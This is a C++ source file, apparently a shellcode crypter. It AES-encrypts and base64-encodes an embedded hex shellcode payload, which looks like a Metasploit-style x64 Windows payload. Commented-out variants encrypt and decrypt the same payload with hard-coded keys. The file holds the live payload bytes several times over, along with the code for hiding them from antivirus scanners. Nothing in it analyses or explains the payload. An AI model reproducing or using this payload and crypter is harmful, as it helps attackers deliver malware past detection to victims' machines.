#define _CRT_SECURE_NO_DEPRECATE



#include <iostream>
#include "AES.h"
#include "Base64.h"


using namespace std;

const char g_key[17] = "asdfwetyhjuytrfd";
const char g_iv[17] = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空

string EncryptionAES(const string& strSrc) //AES加密
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}
string DecryptionAES(const string& strSrc) //AES解密
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "去填充失败！解密出错！！" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}
int main(int argc, char** argv)
{
	// shellcode 去掉 \x
	string source_shellcode = "4831c94881e9c6ffffff488d05efffffff48bb195a0e8cb0ca4bd748315827482df8ffffffe2f4e5128d6840228bd7195a4fddf19a19864f123f5ed582c085791285dea882c085391285fee0824460531043bd79827a17b5666ff0b2e66b96d89303cdb10ba93a4b1b5fc43b986b5c5b66468d6041cb5f195a0ec4350a3fb0515bdedc3b825393921a2ec5b11aa88151a5c7cd3bfec39f188c43bd79827a17b51bcf45bd8b4a1621ba7b7dfcc907f3111f375dc5121393921a2ac5b11a2d96925646c83b8a579e188a4f07b44203d6c91b56cde894128d58024fd5f1900354f57a4fde4f2a139640004607a2231c28e6a553c50ebd38e546693c8cb08b1d9e90bc460d5c6a4ad719138769f97649d71d88ce24ee470a8350d3eac0393b0a6d552d288b4f1f075ef3320f8db0ca1296a3738ee7b0359e8749173f45fdfb8b9fe69a46057282b41751d3cfcd0a204408f9a5dbc4390d21c7580242055282c22e58e09729c4abb40251dbcaccb2ca4b9ea13963e8b0ca4bd7191b5ecde082c2354e0d59c1810a21da401b5e6e4cac8c933d0e0f8df8470ff3019c0ee4f843ad81491b5ecde08b1b9ee69a4fdcf935839a909b4205718bf1aed565887365827a0551a5c407be8bf1df9e476e736571bb62bb0c4f36165ff64ae68f460f74e277d165508e7750bf4e6c5e497ce3daca12969080f159b0ca4bd7";
	cout << "加密前:" << source_shellcode << endl;
	string encrypt_shellcode = EncryptionAES(source_shellcode);
	cout << "加密后:" << encrypt_shellcode << endl;
	string decrypt_shellcode = DecryptionAES(encrypt_shellcode);
	cout << "解密后:" << decrypt_shellcode << endl;

	system("pause");
	return 0;
}



//#include <Windows.h>
//#include "aes.h"
//#include <stdio.h>
//

//// 加密
//int main(int argc, char* argv[])
//{
//
//	unsigned char shellcode[] =
//		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
//		"\xff\xff\x48\xbb\x19\x5a\x0e\x8c\xb0\xca\x4b\xd7\x48\x31\x58"
//		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe5\x12\x8d\x68\x40\x22"
//		"\x8b\xd7\x19\x5a\x4f\xdd\xf1\x9a\x19\x86\x4f\x12\x3f\x5e\xd5"
//		"\x82\xc0\x85\x79\x12\x85\xde\xa8\x82\xc0\x85\x39\x12\x85\xfe"
//		"\xe0\x82\x44\x60\x53\x10\x43\xbd\x79\x82\x7a\x17\xb5\x66\x6f"
//		"\xf0\xb2\xe6\x6b\x96\xd8\x93\x03\xcd\xb1\x0b\xa9\x3a\x4b\x1b"
//		"\x5f\xc4\x3b\x98\x6b\x5c\x5b\x66\x46\x8d\x60\x41\xcb\x5f\x19"
//		"\x5a\x0e\xc4\x35\x0a\x3f\xb0\x51\x5b\xde\xdc\x3b\x82\x53\x93"
//		"\x92\x1a\x2e\xc5\xb1\x1a\xa8\x81\x51\xa5\xc7\xcd\x3b\xfe\xc3"
//		"\x9f\x18\x8c\x43\xbd\x79\x82\x7a\x17\xb5\x1b\xcf\x45\xbd\x8b"
//		"\x4a\x16\x21\xba\x7b\x7d\xfc\xc9\x07\xf3\x11\x1f\x37\x5d\xc5"
//		"\x12\x13\x93\x92\x1a\x2a\xc5\xb1\x1a\x2d\x96\x92\x56\x46\xc8"
//		"\x3b\x8a\x57\x9e\x18\x8a\x4f\x07\xb4\x42\x03\xd6\xc9\x1b\x56"
//		"\xcd\xe8\x94\x12\x8d\x58\x02\x4f\xd5\xf1\x90\x03\x54\xf5\x7a"
//		"\x4f\xde\x4f\x2a\x13\x96\x40\x00\x46\x07\xa2\x23\x1c\x28\xe6"
//		"\xa5\x53\xc5\x0e\xbd\x38\xe5\x46\x69\x3c\x8c\xb0\x8b\x1d\x9e"
//		"\x90\xbc\x46\x0d\x5c\x6a\x4a\xd7\x19\x13\x87\x69\xf9\x76\x49"
//		"\xd7\x1d\x88\xce\x24\xee\x47\x0a\x83\x50\xd3\xea\xc0\x39\x3b"
//		"\x0a\x6d\x55\x2d\x28\x8b\x4f\x1f\x07\x5e\xf3\x32\x0f\x8d\xb0"
//		"\xca\x12\x96\xa3\x73\x8e\xe7\xb0\x35\x9e\x87\x49\x17\x3f\x45"
//		"\xfd\xfb\x8b\x9f\xe6\x9a\x46\x05\x72\x82\xb4\x17\x51\xd3\xcf"
//		"\xcd\x0a\x20\x44\x08\xf9\xa5\xdb\xc4\x39\x0d\x21\xc7\x58\x02"
//		"\x42\x05\x52\x82\xc2\x2e\x58\xe0\x97\x29\xc4\xab\xb4\x02\x51"
//		"\xdb\xca\xcc\xb2\xca\x4b\x9e\xa1\x39\x63\xe8\xb0\xca\x4b\xd7"
//		"\x19\x1b\x5e\xcd\xe0\x82\xc2\x35\x4e\x0d\x59\xc1\x81\x0a\x21"
//		"\xda\x40\x1b\x5e\x6e\x4c\xac\x8c\x93\x3d\x0e\x0f\x8d\xf8\x47"
//		"\x0f\xf3\x01\x9c\x0e\xe4\xf8\x43\xad\x81\x49\x1b\x5e\xcd\xe0"
//		"\x8b\x1b\x9e\xe6\x9a\x4f\xdc\xf9\x35\x83\x9a\x90\x9b\x42\x05"
//		"\x71\x8b\xf1\xae\xd5\x65\x88\x73\x65\x82\x7a\x05\x51\xa5\xc4"
//		"\x07\xbe\x8b\xf1\xdf\x9e\x47\x6e\x73\x65\x71\xbb\x62\xbb\x0c"
//		"\x4f\x36\x16\x5f\xf6\x4a\xe6\x8f\x46\x0f\x74\xe2\x77\xd1\x65"
//		"\x50\x8e\x77\x50\xbf\x4e\x6c\x5e\x49\x7c\xe3\xda\xca\x12\x96"
//		"\x90\x80\xf1\x59\xb0\xca\x4b\xd7";
//	SIZE_T shellcodeSize = sizeof(shellcode);
//
//	unsigned char key[] = "ThisisSecretKey!";
//	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
//
//	struct AES_ctx ctx;
//	AES_init_ctx_iv(&ctx, key, iv);
//	AES_CBC_encrypt_buffer(&ctx, shellcode, shellcodeSize);
//
//	printf("Encrypted buffer:\n");
//
//	for (int i = 0; i < shellcodeSize - 1; i++) {
//		printf("\\x%02x", shellcode[i]);
//	}
//	system("pause");
//}

//// 解密
//int main(int argc, char* argv[])
//{
//
//	unsigned char shellcode[] = "\x9c\xad\x1d\x5b\x52\x35\xdf\x9e\x15\xc3\xa4\x94\xb0\xf6\xd5\x1a\x14\x82\x9b\xc2\xc5\x40\x9e\x03\x45\xdf\x0d\x85\xfc\xff\xc2\xf7\x37\x84\x4b\xa1\x5f\x07\xa3\xf5\xd5\xe3\x54\xe4\x33\x84\x24\xf9\xaf\xbd\xc1\x53\xc9\x87\x4c\xc2\x12\xc7\x24\x6c\x22\xe9\x41\xb4\x47\x9c\xfa\x4c\x20\x8f\x57\x17\x29\x00\x10\x40\x83\xff\xc8\xfe\xa5\x87\x1f\xfd\xec\x30\x72\x07\x71\x59\xf8\x05\xda\x49\x12\xdf\x0a\xc5\xb8\x65\x99\x65\xfa\x5f\xc4\xc3\x8b\x40\x1e\xbe\xf1\x55\xde\x4f\x3a\x65\x2f\x14\xcc\x29\x9d\x7d\x17\xd0\x55\x99\x9e\xc3\x0d\xd7\xbb\xa3\x00\x34\x79\x32\xbe\x16\x66\xf6\xa4\xbc\xda\x40\x06\x7b\x8d\x56\x79\x6b\x21\x79\xd5\xf9\x55\x52\xe2\xd5\x8c\x34\xfd\x1c\x26\xc2\xf5\xd4\x6b\xca\xc3\x74\x91\x9d\xe4\xa2\xf4\x71\x42\x90\x2c\x6a\x11\x66\xf8\x56\x8f\x3c\x26\xa4\x27\x89\x6f\xc2\x02\x48\x53\xed\x08\x32\xa6\x48\x0f\x9a\x39\x0e\x5d\x38\xb4\xa2\x30\x6d\x27\x94\x80\x8c\x06\xa8\x86\x5f\x0b\xda\x44\x83\x51\x55\xfc\xb9\xe2\xcb\xbc\x95\xc8\xd6\x18\xd7\x1b\x04\x3d\xfb\x53\x9b\x57\xa8\xb2\xab\xe7\x27\x3b\xd2\xcb\x53\x20\x11\xcc\x5f\xaf\x31\xcf\xba\x83\xd7\xc7\xa8\xf7\x0c\x78\x6d\x7f\x46\x99\xd7\x33\x23";
//	SIZE_T shellcodeSize = sizeof(shellcode);
//
//	unsigned char key[] = "Captain.MeeloIsTheSuperSecretKey";
//	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
//
//	struct AES_ctx ctx;
//	AES_init_ctx_iv(&ctx, key, iv);
//	AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodeSize);
//
//	printf("Decrypted buffer:\n");
//
//	for (int i = 0; i < shellcodeSize - 1; i++) {
//		printf("\\x%02x", shellcode[i]);
//	}
//	system("pause");
//}


//// AES库加密
//int main(int argc, char* argv[])
//{
//	unsigned char shellcode[] =
//		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
//		"\xff\xff\x48\xbb\x19\x5a\x0e\x8c\xb0\xca\x4b\xd7\x48\x31\x58"
//		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe5\x12\x8d\x68\x40\x22"
//		"\x8b\xd7\x19\x5a\x4f\xdd\xf1\x9a\x19\x86\x4f\x12\x3f\x5e\xd5"
//		"\x82\xc0\x85\x79\x12\x85\xde\xa8\x82\xc0\x85\x39\x12\x85\xfe"
//		"\xe0\x82\x44\x60\x53\x10\x43\xbd\x79\x82\x7a\x17\xb5\x66\x6f"
//		"\xf0\xb2\xe6\x6b\x96\xd8\x93\x03\xcd\xb1\x0b\xa9\x3a\x4b\x1b"
//		"\x5f\xc4\x3b\x98\x6b\x5c\x5b\x66\x46\x8d\x60\x41\xcb\x5f\x19"
//		"\x5a\x0e\xc4\x35\x0a\x3f\xb0\x51\x5b\xde\xdc\x3b\x82\x53\x93"
//		"\x92\x1a\x2e\xc5\xb1\x1a\xa8\x81\x51\xa5\xc7\xcd\x3b\xfe\xc3"
//		"\x9f\x18\x8c\x43\xbd\x79\x82\x7a\x17\xb5\x1b\xcf\x45\xbd\x8b"
//		"\x4a\x16\x21\xba\x7b\x7d\xfc\xc9\x07\xf3\x11\x1f\x37\x5d\xc5"
//		"\x12\x13\x93\x92\x1a\x2a\xc5\xb1\x1a\x2d\x96\x92\x56\x46\xc8"
//		"\x3b\x8a\x57\x9e\x18\x8a\x4f\x07\xb4\x42\x03\xd6\xc9\x1b\x56"
//		"\xcd\xe8\x94\x12\x8d\x58\x02\x4f\xd5\xf1\x90\x03\x54\xf5\x7a"
//		"\x4f\xde\x4f\x2a\x13\x96\x40\x00\x46\x07\xa2\x23\x1c\x28\xe6"
//		"\xa5\x53\xc5\x0e\xbd\x38\xe5\x46\x69\x3c\x8c\xb0\x8b\x1d\x9e"
//		"\x90\xbc\x46\x0d\x5c\x6a\x4a\xd7\x19\x13\x87\x69\xf9\x76\x49"
//		"\xd7\x1d\x88\xce\x24\xee\x47\x0a\x83\x50\xd3\xea\xc0\x39\x3b"
//		"\x0a\x6d\x55\x2d\x28\x8b\x4f\x1f\x07\x5e\xf3\x32\x0f\x8d\xb0"
//		"\xca\x12\x96\xa3\x73\x8e\xe7\xb0\x35\x9e\x87\x49\x17\x3f\x45"
//		"\xfd\xfb\x8b\x9f\xe6\x9a\x46\x05\x72\x82\xb4\x17\x51\xd3\xcf"
//		"\xcd\x0a\x20\x44\x08\xf9\xa5\xdb\xc4\x39\x0d\x21\xc7\x58\x02"
//		"\x42\x05\x52\x82\xc2\x2e\x58\xe0\x97\x29\xc4\xab\xb4\x02\x51"
//		"\xdb\xca\xcc\xb2\xca\x4b\x9e\xa1\x39\x63\xe8\xb0\xca\x4b\xd7"
//		"\x19\x1b\x5e\xcd\xe0\x82\xc2\x35\x4e\x0d\x59\xc1\x81\x0a\x21"
//		"\xda\x40\x1b\x5e\x6e\x4c\xac\x8c\x93\x3d\x0e\x0f\x8d\xf8\x47"
//		"\x0f\xf3\x01\x9c\x0e\xe4\xf8\x43\xad\x81\x49\x1b\x5e\xcd\xe0"
//		"\x8b\x1b\x9e\xe6\x9a\x4f\xdc\xf9\x35\x83\x9a\x90\x9b\x42\x05"
//		"\x71\x8b\xf1\xae\xd5\x65\x88\x73\x65\x82\x7a\x05\x51\xa5\xc4"
//		"\x07\xbe\x8b\xf1\xdf\x9e\x47\x6e\x73\x65\x71\xbb\x62\xbb\x0c"
//		"\x4f\x36\x16\x5f\xf6\x4a\xe6\x8f\x46\x0f\x74\xe2\x77\xd1\x65"
//		"\x50\x8e\x77\x50\xbf\x4e\x6c\x5e\x49\x7c\xe3\xda\xca\x12\x96"
//		"\x90\x80\xf1\x59\xb0\xca\x4b\xd7";
//	SIZE_T shellcodeSize = sizeof(shellcode);
//	printf("\n原始长度%lld\n", shellcodeSize);
//	//unsigned char key[] = "Captain.MeeloIsTheSuperSecretKey";
//	//unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
//
//	printf("Source buffer:\n");
//	for (int i = 0; i < shellcodeSize - 1; i++) {
//		printf("\\x%02x", shellcode[i]);
//	}
//
//	AES aes(AESKeyLength::AES_256);
//
//	unsigned char iv[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
//	unsigned char key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
//	  0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f };
//	unsigned int len;
//
//	unsigned char* out = aes.EncryptCBC(shellcode, shellcodeSize, key, iv, len);
//
//	printf("\n\nEncrypted buffer:\n");
//	for (int i = 0; i < len - 1; i++) {
//		printf("\\x%02x", out[i]);
//	}
//
//	unsigned char* innew = aes.DecryptCBC(out, len, key, iv);
//
//	printf("\n加密、解密长度%lld\n", len);
//	printf("\n\nDecrypted buffer:\n");
//	for (int i = 0; i < len; i++) {
//		printf("\\x%02x", innew[i]);
//	}
//
//
//	delete[] out;
//	delete[] innew;
//	
//
//	system("pause");
//}

//unsigned int GetPaddingLength(unsigned int len)
//{
//	unsigned int blockBytesLen = 16 * sizeof(unsigned char);
//	unsigned int lengthWithPadding = (len / blockBytesLen);
//	if (len % blockBytesLen) {
//		lengthWithPadding++;
//	}
//
//	lengthWithPadding *= blockBytesLen;
//
//	return lengthWithPadding;
//}
//
//// AES库解密
//int main(int argc, char* argv[])
//{
//
//	unsigned char shellcode[] = "\x12\x75\x9b\x9b\xcf\x6e\x85\x51\xd2\x14\x22\x75\x38\x58\x5b\x0b\x45\x64\x96\xd2\xe7\x0b\x25\x12\x98\xf7\x96\x78\x8c\xdf\x45\x80\x2f\x8b\xef\x3b\xd2\xc4\xe0\x82\x97\x56\x9d\xfa\x4c\xa1\x10\x2d\x6c\x53\x82\xe5\x53\xd5\xf9\xf6\x24\x9b\x44\x8c\xe1\x2c\x6e\xb4\xae\x0c\x58\xf7\x49\xba\x4d\x6c\x19\x92\x34\xb1\x96\xe8\xbd\xb0\xdc\x06\x57\x0f\x0d\x69\xb7\xaf\xb2\xbf\xcd\x33\x17\x46\x88\xaf\xbe\x08\xb0\x75\xa8\x75\xa2\x1e\xb0\x44\x00\x6c\xd4\x49\x87\x1a\x1c\xb7\x43\xa1\x54\xf5\x60\xe4\x9c\x79\x85\x6d\x38\xd7\x0f\x6c\x8b\x39\xca\x1a\xeb\x07\x12\x6d\xcc\x8b\x73\xf7\x7e\x57\x8f\x91\x8c\xe8\xb5\xbe\x87\x9e\x3e\x9b\x61\xa3\x0d\x61\xda\xdd\x9f\xd0\xf7\x2a\x56\x35\x30\x86\xaa\x1d\x60\x4b\x5d\x1d\xe1\x6e\xe5\x42\xc2\xd7\x33\x9a\x1b\x55\xf6\xef\x1d\x3d\x68\x14\x8a\x76\x56\xa4\xa1\xab\xbb\x45\x2c\x26\xf7\xf6\x2e\xe0\x02\x9a\x4d\xfb\xa7\xff\x62\xbe\x72\x08\x68\x2a\x3b\xe1\xf8\xf2\x1a\x35\x0f\xf0\x09\xe9\xb1\xd6\x9b\x57\x2f\x10\x48\x81\xe0\x8a\x25\x4e\x75\x8b\xae\x8b\x58\xe0\x5b\x25\xb7\x7c\xd4\x47\x43\x03\x99\xb1\x82\x1c\x35\x26\x66\x41\x66\x84\x83\x41\x67\xb6\x66\x12\x90\xbd\xf4\x29\xa7\x21\xcb\x0d\x92\xbb\xae\xb4\xae\x80\x61\x9b\x87\xbe\x31\x91\xe1\x86\x12\x58\xc8\x2b\x3a\xa1\x41\x11\xdd\x59\xbc\x96\x3f\xef\xa8\x98\xf0\x20\x22\x61\x0f\xbd\xba\x1b\x16\x1c\xaf\x9b\x94\xda\xe7\x86\x0e\xd9\xb1\x06\x9c\x0d\xef\xdd\xd7\x11\xf0\x73\x12\x69\x04\xd4\x53\x97\xb9\x74\x4d\xba\xec\xdc\x55\xe6\x11\x4d\xa6\xf9\xfd\xcd\x90\x73\x8a\xa6\x8a\xaf\xa0\x61\xc4\xc9\x63\x7d\xb5\x8f\x72\x15\x0d\x5b\xa0\x75\x34\xa5\x49\xd4\xda\x45\x51\xa1\xba\x21\xee\x51\x6c\x09\x42\xe0\x15\x4a\x54\x77\x3e\x2f\x55\x62\xec\x8a\x2a\x96\x95\xbf\x00\x05\x20\xc2\xe1\x34\xe8\xd5\x03\xf5\xcb\x44\x6f\x6d\x1f\xa6\xc1\xe3\xd3\xcd\x80\x67\x8d\xb3\x38\x63\x56\xff\x55\x19\x64\xaf\xc4\x5d\xd6\x80\xc0\xb9\x37\xa5\x1f\x63\x6d\xa4\x77\x50\xc8\x4b\x53\xee\x97\x8a\xe2\xbb\x47\x6a\xd0\xc0\xd7\xbc\x6b\x07\xaa\x09\xaa\x9f\xcb\x0a\xde\xdd\x46\xf1\x95\x81\xe8\xa8\xc5\xd6\x5b\x29\xe8\x33\xd5\xe0\xbd\x35\x87\x44\xe5\x69\xc4\x61\xba\xdd\x5f\x09\xe1\xca\xab\xc0\x70\x65\xdf\x3b\x10\x61\xfd\x00\xe5";
//	SIZE_T shellcodeSize = sizeof(shellcode);
//
//	unsigned char iv[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
//	unsigned char key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
//	  0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f };
//
//	AES aes(AESKeyLength::AES_256);
//
//	unsigned int len = GetPaddingLength(shellcodeSize);
//	printf("原来长度：%lld\n", shellcodeSize);
//	printf("padding 长度：%lld\n", len);
//
//	unsigned char* innew = aes.DecryptCBC(shellcode, len, key, iv);
//
//	printf("Decrypted buffer:\n");
//
//	for (int i = 0; i < shellcodeSize ; i++) {
//		printf("\\x%02x", innew[i]);
//	}
//	system("pause");
//}